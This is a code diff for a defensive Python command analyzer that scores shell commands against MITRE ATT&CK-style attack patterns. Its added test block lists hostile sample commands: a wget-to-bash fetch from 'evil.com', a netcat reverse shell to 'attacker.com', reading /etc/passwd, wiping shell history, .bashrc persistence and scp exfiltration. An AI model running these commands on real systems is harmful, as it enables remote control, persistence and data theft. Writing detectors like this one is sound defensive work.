@@ -1,8 +1,11 @@
+"""
+Command Analyzer
+Analyzes shell commands to detect malicious intent and techniques
+"""
 import re
 import logging
-from typing import Dict, List, Any
+from typing import Dict, List, Any, Set
 from dataclasses import dataclass
-from chronos.core.threat_scoring import calculate_risk_level
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -10,6 +13,7 @@ logger = logging.getLogger(__name__)
 
 @dataclass
 class CommandAnalysis:
+    """Result of command analysis"""
     command: str
     techniques: List[str]
     risk_score: int
@@ -19,13 +23,17 @@ class CommandAnalysis:
 
 
 class CommandAnalyzer:
-    """Analyzes shell commands for attack patterns using MITRE ATT&CK"""
+    """
+    Analyzes shell commands to detect attack techniques
+    Based on MITRE ATT&CK framework and common attack patterns
+    """
     
     def __init__(self):
         self._compile_patterns()
         
     def _compile_patterns(self):
-        """Compile regex patterns once for performance"""
+        """Compile regex patterns for detection"""
+        
         # Reconnaissance patterns
         self.recon_patterns = {
             'system_info': re.compile(r'\b(uname|hostname|whoami|id|uptime|arch)\b'),
@@ -96,79 +104,87 @@ class CommandAnalyzer:
         }
         
     def analyze(self, command: str) -> CommandAnalysis:
-        """Analyze shell command for malicious patterns"""
+        """
+        Analyze a shell command for malicious patterns
+        
+        Args:
+            command: The shell command to analyze
+            
+        Returns:
+            CommandAnalysis object with results
+        """
         techniques = []
         indicators = []
         risk_score = 0
-
-        # Check patterns by category
+        metadata = {}
+        
+        # Check all pattern categories
         for technique, pattern in self.recon_patterns.items():
             if pattern.search(command):
                 techniques.append(f"reconnaissance.{technique}")
-                indicators.append(f"Recon: {technique}")
+                indicators.append(f"Reconnaissance: {technique}")
                 risk_score += 5
-
+        
         for technique, pattern in self.persistence_patterns.items():
             if pattern.search(command):
                 techniques.append(f"persistence.{technique}")
                 indicators.append(f"Persistence: {technique}")
                 risk_score += 25
-
+        
         for technique, pattern in self.privesc_patterns.items():
             if pattern.search(command):
                 techniques.append(f"privilege_escalation.{technique}")
-                indicators.append(f"PrivEsc: {technique}")
+                indicators.append(f"Privilege Escalation: {technique}")
                 risk_score += 30
-
+        
         for technique, pattern in self.lateral_patterns.items():
             if pattern.search(command):
                 techniques.append(f"lateral_movement.{technique}")
-                indicators.append(f"Lateral: {technique}")
+                indicators.append(f"Lateral Movement: {technique}")
                 risk_score += 20
-
+        
         for technique, pattern in self.exfil_patterns.items():
             if pattern.search(command):
                 techniques.append(f"exfiltration.{technique}")
-                indicators.append(f"Exfil: {technique}")
+                indicators.append(f"Data Exfiltration: {technique}")
                 risk_score += 25
-
+        
         for technique, pattern in self.execution_patterns.items():
             if pattern.search(command):
                 techniques.append(f"execution.{technique}")
-                indicators.append(f"Exec: {technique}")
+                indicators.append(f"Code Execution: {technique}")
                 risk_score += 35
-
+        
         for technique, pattern in self.evasion_patterns.items():
             if pattern.search(command):
                 techniques.append(f"defense_evasion.{technique}")
-                indicators.append(f"Evasion: {technique}")
+                indicators.append(f"Defense Evasion: {technique}")
                 risk_score += 20
-
+        
         for technique, pattern in self.credential_patterns.items():
             if pattern.search(command):
                 techniques.append(f"credential_access.{technique}")
-                indicators.append(f"Creds: {technique}")
+                indicators.append(f"Credential Access: {technique}")
                 risk_score += 30
-
-        # Metadata
-        metadata = {
-            'has_pipe': '|' in command,
-            'has_redirect': '>' in command or '<' in command,
-            'has_background': '&' in command,
-            'has_variables': '$' in command,
-            'command_length': len(command)
-        }
-
+        
+        # Additional metadata extraction
+        metadata['has_pipe'] = '|' in command
+        metadata['has_redirect'] = '>' in command or '<' in command
+        metadata['has_background'] = '&' in command
+        metadata['has_variables'] = '$' in command
+        metadata['command_length'] = len(command)
+        
         # Adjust risk for complex commands
         if metadata['has_pipe'] and len(command) > 50:
             risk_score += 5
             indicators.append("Complex piped command")
-
-        risk_level = calculate_risk_level(risk_score)
-
+        
+        # Calculate risk level
+        risk_level = self._calculate_risk_level(risk_score)
+        
         if techniques:
-            logger.info(f"Detected {len(techniques)} techniques (Risk: {risk_level})")
-
+            logger.info(f"[CommandAnalyzer] Detected techniques: {techniques} (Risk: {risk_level})")
+        
         return CommandAnalysis(
             command=command,
             techniques=techniques,
@@ -177,27 +193,49 @@ class CommandAnalyzer:
             indicators=indicators,
             metadata=metadata
         )
-
+    
+    def _calculate_risk_level(self, score: int) -> str:
+        """Calculate risk level from score"""
+        if score >= 60:
+            return "critical"
+        elif score >= 40:
+            return "high"
+        elif score >= 20:
+            return "medium"
+        elif score > 0:
+            return "low"
+        else:
+            return "benign"
+    
     def batch_analyze(self, commands: List[str]) -> List[CommandAnalysis]:
         """Analyze multiple commands"""
         return [self.analyze(cmd) for cmd in commands]
-
+    
     def get_session_risk_profile(self, commands: List[str]) -> Dict[str, Any]:
-        """Build risk profile from session commands"""
+        """
+        Analyze a session's commands to build a risk profile
+        
+        Args:
+            commands: List of commands from a session
+            
+        Returns:
+            Risk profile with aggregated statistics
+        """
         analyses = self.batch_analyze(commands)
-
+        
         all_techniques = []
         total_risk = 0
         technique_categories = set()
-
+        
         for analysis in analyses:
             all_techniques.extend(analysis.techniques)
             total_risk += analysis.risk_score
             technique_categories.update([t.split('.')[0] for t in analysis.techniques])
-
+        
+        # Count technique frequency
         from collections import Counter
         technique_counts = Counter(all_techniques)
-
+        
         return {
             "total_commands": len(commands),
             "malicious_commands": len([a for a in analyses if a.techniques]),
@@ -206,5 +244,44 @@ class CommandAnalyzer:
             "unique_techniques": len(set(all_techniques)),
             "technique_categories": list(technique_categories),
             "top_techniques": dict(technique_counts.most_common(10)),
-            "overall_risk_level": calculate_risk_level(total_risk // len(commands) if commands else 0)
+            "overall_risk_level": self._calculate_risk_level(total_risk // len(commands) if commands else 0)
         }
+
+
+# Example usage and testing
+if __name__ == "__main__":
+    analyzer = CommandAnalyzer()
+    
+    # Test commands
+    test_commands = [
+        "ls -la",
+        "cat /etc/passwd",
+        "wget http://evil.com/shell.sh | bash",
+        "find / -perm -4000 2>/dev/null",
+        "echo 'malicious' >> ~/.bashrc",
+        "history -c && rm ~/.bash_history",
+        "nc -e /bin/bash attacker.com 4444",
+        "tar czf backup.tar.gz /var/www && scp backup.tar.gz user@remote:/tmp/",
+    ]
+    
+    print("=" * 80)
+    print("COMMAND ANALYSIS")
+    print("=" * 80)
+    
+    for cmd in test_commands:
+        analysis = analyzer.analyze(cmd)
+        print(f"\nCommand: {cmd}")
+        print(f"Risk Level: {analysis.risk_level} (Score: {analysis.risk_score})")
+        print(f"Techniques: {', '.join(analysis.techniques) if analysis.techniques else 'None'}")
+        if analysis.indicators:
+            print(f"Indicators:")
+            for indicator in analysis.indicators:
+                print(f"  - {indicator}")
+    
+    print("\n" + "=" * 80)
+    print("SESSION RISK PROFILE")
+    print("=" * 80)
+    
+    profile = analyzer.get_session_risk_profile(test_commands)
+    import json
+    print(json.dumps(profile, indent=2))
